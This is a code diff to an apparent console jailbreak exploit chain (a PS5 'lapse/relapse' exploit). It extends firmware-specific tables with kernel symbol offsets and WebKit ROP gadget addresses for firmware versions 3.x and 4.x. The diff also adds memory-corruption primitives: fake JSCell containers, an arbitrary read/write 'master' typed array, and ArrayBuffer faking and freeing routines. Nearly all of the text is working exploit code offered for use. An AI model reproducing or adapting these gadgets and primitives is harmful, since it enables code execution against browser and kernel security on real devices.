@@ -23,7 +23,7 @@ function get_syscall(id) {
 }
 
 async function exploit() {
-  if (version.major < 5) {
+  if (version.major < 3) {
     await load_script('src/lapse.js');
   } else {
     await load_script('src/ps5/relapse.js');
@@ -151,14 +151,362 @@ async function post_jailbreak() {
 }
 
 const impl_map = {
+  3: {
+    0: {
+      k_sysctl___kern_smp_cpus: 0x256d710,
+      k_route_output_rtmsg2_ret: 0xa1ab8a,
+      k_ntpadj_lock: 0x186e9f8,
+      k_dynlib_status: 0x118,
+      k_allproc: 0x333dc58,
+      k_aio_table: 0xc00,
+
+      lk_close: 0x33980,
+      lk__error: 0x1cf70,
+      lc_strerror: 0x7b200,
+
+      wk_pthread_create: 0x21ead30,
+      wk_pthread_join: 0x21ead70,
+      wk_expm1_builtin: 0x7be0,
+      wk___imp___error: 0x28ddea8,
+      wk___imp_strerror: 0x28dded0,
+
+      wk_TypedArray_m_mode: 0x1c,
+      wk_JSFunction_m_function: 0x28,
+      wk_ArrayBuffer_m_contents_m_data: 0x10,
+      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x24,
+      wk_JSGlobalObject_m_vm_topEntryFrame: 0x9ee0,
+
+      get wk_RET() {
+        return webkit_base.add(0xc7);
+      },
+      get wk_LEAVE_RET() {
+        return webkit_base.add(0x20c0766);
+      },
+      get wk_POP_R8_RET() {
+        return webkit_base.add(0x1d8acc3);
+      },
+      get wk_POP_R9_RET() {
+        return webkit_base.add(0x12fb56c);
+      },
+      get wk_POP_R11_RET() {
+        return webkit_base.add(0x1b2be9b);
+      },
+      get wk_POP_R12_RET() {
+        return webkit_base.add(0x99a21);
+      },
+      get wk_POP_R13_RET() {
+        return webkit_base.add(0x1917101);
+      },
+      get wk_POP_R14_RET() {
+        return webkit_base.add(0x21e53a9);
+      },
+      get wk_POP_R15_RET() {
+        return webkit_base.add(0x2181023);
+      },
+      get wk_POP_RAX_RET() {
+        return webkit_base.add(0x70d534);
+      },
+      get wk_POP_RBX_RET() {
+        return webkit_base.add(0xc1ce06);
+      },
+      get wk_POP_RCX_RET() {
+        return webkit_base.add(0x1ec9443);
+      },
+      get wk_POP_RDX_RET() {
+        return webkit_base.add(0x1583126);
+      },
+      get wk_POP_RDI_RET() {
+        return webkit_base.add(0x2181024);
+      },
+      get wk_POP_RSI_RET() {
+        return webkit_base.add(0x21e53aa);
+      },
+      get wk_POP_RBP_RET() {
+        return webkit_base.add(0x21eae9b);
+      },
+      get wk_POP_RSP_RET() {
+        return webkit_base.add(0x21a259f);
+      },
+      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
+        return webkit_base.add(0x1f8865c);
+      },
+      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
+        return webkit_base.add(0x176b510);
+      },
+      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
+        return webkit_base.add(0x1c3b5a4);
+      },
+      make_fake_container(jscell) {
+        const container = {
+          jscell: jscell, // NaN-boxed, fix later
+          butterfly: null, // becomes 0x2, fix later
+          vector: arw.victim,
+          length_and_mode: true, // becomes 0x7
+        };
+
+        delete container.butterfly; // becomes 0
+
+        return container;
+      },
+      make_master(victim_addr) {
+        arw.victim.setBInt(0x10, victim_addr, true);
+        arw.victim.setUint32(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
+      },
+      fix_victim() {
+        const victim_addr = arw.addrof(arw.victim);
+        logger.debug(`victim_addr: ${victim_addr}`);
+
+        arw.view(victim_addr).setInt32(0x18, -1, true);
+      },
+      ab_fake(ab, addr, len) {
+        const ab_addr = arw.addrof(ab);
+        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
+        const m_data = arw.view(m_impl).getBInt(0x10, true);
+
+        ab.m_data = m_data;
+
+        arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
+        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, addr, true);
+        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
+      },
+      ab_free(ab) {
+        const ab_addr = arw.addrof(ab);
+        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
+
+        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
+        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true);
+        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
+      },
+      ab_data(ab) {
+        const ab_addr = arw.addrof(ab);
+        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
+
+        return arw.view(m_impl).getBInt(impl.wk_ArrayBuffer_m_contents_m_data, true);
+      },
+    },
+    0x10: {
+      k_route_output_rtmsg2_ret: 0xa1abca,
+    },
+    0x20: {
+      k_route_output_rtmsg2_ret: 0xa1b08a,
+
+      wk_pthread_create: 0x21eaef0,
+      wk_pthread_join: 0x21eaf30,
+
+      get wk_LEAVE_RET() {
+        return webkit_base.add(0x21bc6b3);
+      },
+      get wk_POP_R8_RET() {
+        return webkit_base.add(0x1d8ae93);
+      },
+      get wk_POP_R9_RET() {
+        return webkit_base.add(0x12fb6ac);
+      },
+      get wk_POP_R11_RET() {
+        return webkit_base.add(0x1b8bf6f);
+      },
+      get wk_POP_R12_RET() {
+        return webkit_base.add(0x5e2e2d);
+      },
+      get wk_POP_R13_RET() {
+        return webkit_base.add(0x1c1cc7f);
+      },
+      get wk_POP_R14_RET() {
+        return webkit_base.add(0x21e5569);
+      },
+      get wk_POP_R15_RET() {
+        return webkit_base.add(0x21811e3);
+      },
+      get wk_POP_RAX_RET() {
+        return webkit_base.add(0x201464d);
+      },
+      get wk_POP_RBX_RET() {
+        return webkit_base.add(0xc1cea6);
+      },
+      get wk_POP_RCX_RET() {
+        return webkit_base.add(0x1f44d43);
+      },
+      get wk_POP_RDX_RET() {
+        return webkit_base.add(0x1b0135f);
+      },
+      get wk_POP_RDI_RET() {
+        return webkit_base.add(0x21811e4);
+      },
+      get wk_POP_RSI_RET() {
+        return webkit_base.add(0x21e556a);
+      },
+      get wk_POP_RBP_RET() {
+        return webkit_base.add(0x21eb05b);
+      },
+      get wk_POP_RSP_RET() {
+        return webkit_base.add(0xb36a06);
+      },
+      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
+        return webkit_base.add(0x1f8882c);
+      },
+      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
+        return webkit_base.add(0x176b6e0);
+      },
+      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
+        return webkit_base.add(0x1c3b774);
+      },
+    },
+  },
+  4: {
+    0: {
+      k_sysctl___kern_smp_cpus: 0x260fd50,
+      k_route_output_rtmsg2_ret: 0xa48c47,
+      k_ntpadj_lock: 0x190f758,
+      k_allproc: 0x33edcb8,
+
+      lk_close: 0x34030,
+      lk__error: 0x1d2a0,
+      lc_strerror: 0x7c6d0,
+
+      wk_pthread_create: 0x2208b40,
+      wk_pthread_join: 0x2208b80,
+      wk_expm1_builtin: 0x2518,
+      wk___imp___error: 0x28f9d28,
+      wk___imp_strerror: 0x28f9d50,
+
+      get wk_LEAVE_RET() {
+        return webkit_base.add(0x1be4950);
+      },
+      get wk_POP_R8_RET() {
+        return webkit_base.add(0x1da92c3);
+      },
+      get wk_POP_R9_RET() {
+        return webkit_base.add(0x1c7af80);
+      },
+      get wk_POP_R11_RET() {
+        return webkit_base.add(0x19c1b79);
+      },
+      get wk_POP_R12_RET() {
+        return webkit_base.add(0xce6250);
+      },
+      get wk_POP_R13_RET() {
+        return webkit_base.add(0x1936b11);
+      },
+      get wk_POP_R14_RET() {
+        return webkit_base.add(0x2203119);
+      },
+      get wk_POP_R15_RET() {
+        return webkit_base.add(0x21d35c3);
+      },
+      get wk_POP_RAX_RET() {
+        return webkit_base.add(0xcc5bbc);
+      },
+      get wk_POP_RBX_RET() {
+        return webkit_base.add(0x2202df0);
+      },
+      get wk_POP_RCX_RET() {
+        return webkit_base.add(0x1d532d3);
+      },
+      get wk_POP_RDX_RET() {
+        return webkit_base.add(0x213947e);
+      },
+      get wk_POP_RDI_RET() {
+        return webkit_base.add(0x21d35c4);
+      },
+      get wk_POP_RSI_RET() {
+        return webkit_base.add(0x220311a);
+      },
+      get wk_POP_RBP_RET() {
+        return webkit_base.add(0x2208cab);
+      },
+      get wk_POP_RSP_RET() {
+        return webkit_base.add(0x14ff8f0);
+      },
+      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
+        return webkit_base.add(0x1fa8e6c);
+      },
+      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
+        return webkit_base.add(0x1789f70);
+      },
+      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
+        return webkit_base.add(0x1c5a054);
+      },
+    },
+    2: {
+      k_route_output_rtmsg2_ret: 0xa48c97,
+
+      wk_pthread_create: 0x2208ba0,
+      wk_pthread_join: 0x2208be0,
+
+      get wk_LEAVE_RET() {
+        return webkit_base.add(0x1bb3a18);
+      },
+      get wk_POP_R8_RET() {
+        return webkit_base.add(0x1da9323);
+      },
+      get wk_POP_R9_RET() {
+        return webkit_base.add(0x1c7afe0);
+      },
+      get wk_POP_R11_RET() {
+        return webkit_base.add(0x19c1bd9);
+      },
+      get wk_POP_R12_RET() {
+        return webkit_base.add(0xce62b0);
+      },
+      get wk_POP_R13_RET() {
+        return webkit_base.add(0x1936b71);
+      },
+      get wk_POP_R14_RET() {
+        return webkit_base.add(0x2203179);
+      },
+      get wk_POP_R15_RET() {
+        return webkit_base.add(0x21d3623);
+      },
+      get wk_POP_RAX_RET() {
+        return webkit_base.add(0x15d1e44);
+      },
+      get wk_POP_RBX_RET() {
+        return webkit_base.add(0x2202e50);
+      },
+      get wk_POP_RCX_RET() {
+        return webkit_base.add(0x21e42f3);
+      },
+      get wk_POP_RDX_RET() {
+        return webkit_base.add(0xa02f15);
+      },
+      get wk_POP_RDI_RET() {
+        return webkit_base.add(0x21d3624);
+      },
+      get wk_POP_RSI_RET() {
+        return webkit_base.add(0x220317a);
+      },
+      get wk_POP_RBP_RET() {
+        return webkit_base.add(0x2208d0b);
+      },
+      get wk_POP_RSP_RET() {
+        return webkit_base.add(0x14ff950);
+      },
+      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
+        return webkit_base.add(0x1fa8ecc);
+      },
+      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
+        return webkit_base.add(0x1789fd0);
+      },
+      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
+        return webkit_base.add(0x1c5a0b4);
+      },
+    },
+    3: {
+      k_route_output_rtmsg2_ret: 0xa48d27,
+    },
+    0x50: {
+      k_route_output_rtmsg2_ret: 0xa48ed7,
+    },
+    0x51: {
+      k_route_output_rtmsg2_ret: 0xa49307,
+    },
+  },
   5: {
     0: {
       k_sysctl___kern_smp_cpus: 0x273c6e0,
       k_route_output_rtmsg2_ret: 0xa7884f,
       k_ntpadj_lock: 0x1a3efb8,
-      k_dynlib_status: 0x118,
       k_allproc: 0x355dd00,
-      k_aio_table: 0xc00,
 
       lk_close: 0x35680,
       lk__error: 0x1d830,
@@ -170,15 +518,6 @@ const impl_map = {
       wk___imp___error: 0x28d4da0,
       wk___imp_strerror: 0x28d4dc8,
 
-      wk_TypedArray_m_mode: 0x1c,
-      wk_JSFunction_m_function: 0x28,
-      wk_ArrayBuffer_m_contents_m_data: 0x10,
-      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x24,
-      wk_JSGlobalObject_m_vm_topEntryFrame: 0x9ee0,
-
-      get wk_RET() {
-        return webkit_base.add(0xc7);
-      },
       get wk_LEAVE_RET() {
         return webkit_base.add(0x8ff1e3);
       },
@@ -235,53 +574,6 @@ const impl_map = {
       },
       get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
         return webkit_base.add(0xb511ed);
-      },
-      make_fake_container(jscell) {
-        const container = {
-          jscell: jscell, // NaN-boxed, fix later
-          butterfly: null, // becomes 0x2, fix later
-          vector: arw.victim,
-          length_and_mode: true, // becomes 0x7
-        };
-
-        delete container.butterfly; // becomes 0
-
-        return container;
-      },
-      make_master(victim_addr) {
-        arw.victim.setBInt(0x10, victim_addr, true);
-        arw.victim.setUint32(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
-      },
-      fix_victim() {
-        const victim_addr = arw.addrof(arw.victim);
-        logger.debug(`victim_addr: ${victim_addr}`);
-
-        arw.view(victim_addr).setInt32(0x18, -1, true);
-      },
-      ab_fake(ab, addr, len) {
-        const ab_addr = arw.addrof(ab);
-        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
-        const m_data = arw.view(m_impl).getBInt(0x10, true);
-
-        ab.m_data = m_data;
-
-        arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
-        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, addr, true);
-        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
-      },
-      ab_free(ab) {
-        const ab_addr = arw.addrof(ab);
-        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
-
-        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
-        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true);
-        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
-      },
-      ab_data(ab) {
-        const ab_addr = arw.addrof(ab);
-        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
-
-        return arw.view(m_impl).getBInt(impl.wk_ArrayBuffer_m_contents_m_data, true);
       },
     },
     0x10: {
@@ -459,31 +751,6 @@ const impl_map = {
         logger.debug(`victim_addr: ${victim_addr}`);
 
         arw.view(victim_addr).setBInt(0x18, -1, true);
-      },
-      ab_fake(ab, addr, len) {
-        const ab_addr = arw.addrof(ab);
-        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
-        const m_data = arw.view(m_impl).getBInt(0x10, true);
-
-        ab.m_data = m_data;
-
-        arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
-        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, addr, true);
-        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
-      },
-      ab_free(ab) {
-        const ab_addr = arw.addrof(ab);
-        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
-
-        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
-        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true);
-        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
-      },
-      ab_data(ab) {
-        const ab_addr = arw.addrof(ab);
-        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
-
-        return arw.view(m_impl).getBInt(impl.wk_ArrayBuffer_m_contents_m_data, true);
       },
     },
     2: {
